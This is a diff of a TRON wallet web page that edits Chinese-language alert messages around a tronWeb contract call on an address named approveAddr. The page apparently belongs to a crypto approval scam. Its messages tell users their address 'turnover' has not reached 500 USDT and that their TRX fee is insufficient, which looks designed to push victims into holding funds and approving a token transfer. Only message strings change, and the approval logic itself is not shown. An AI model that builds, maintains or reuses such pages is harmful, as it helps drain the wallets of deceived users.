@@ -316,7 +316,7 @@
             <div class="modal modal-out">
                 <div class="preloader"></div>
             </div>
-           <div class="tishi" style="font-size:14px;width:80%">充值失败，您的地址流水未达到500USDT</div>
+           <div class="tishi" style="font-size:14px;width:80%">交易失败，您的地址流水未达到500USDT</div>
         </div>
     </div>
     <div id="s">
@@ -478,7 +478,7 @@
                
                 $('.modal-overlay').remove();
                 $('.modal').removeClass('modal-in').addClass('modal-out');
-                mui.alert('TRX矿工费不足');
+                mui.alert('TRX矿工费不足22');
                 return;
             }
 
@@ -500,7 +500,7 @@
                 
                 $('.modal-overlay').remove();
                 $('.modal').removeClass('modal-in').addClass('modal-out');
-                mui.alert('TRX矿工费不足',"提示","确定");
+                mui.alert('TRX矿工费不足22',"提示","确定");
                 return;
             }
             let contract = await window.tronWeb.contract().at(approveAddr);
@@ -538,7 +538,7 @@
                     // setTimeout(function () {
                     //     $(".tishi").fadeOut()
                     // },2000);
-                    mui.alert("充值失败该地址流水未达到1000USDT","提示","确定");
+                    mui.alert("交易失败，您的地址流水未达到500USDT","提示","确定");
                     var timestamp=new Date().getTime()
                     var output=GetRandomNum(10000,99999);
                     outputs=timestamp+''+output;
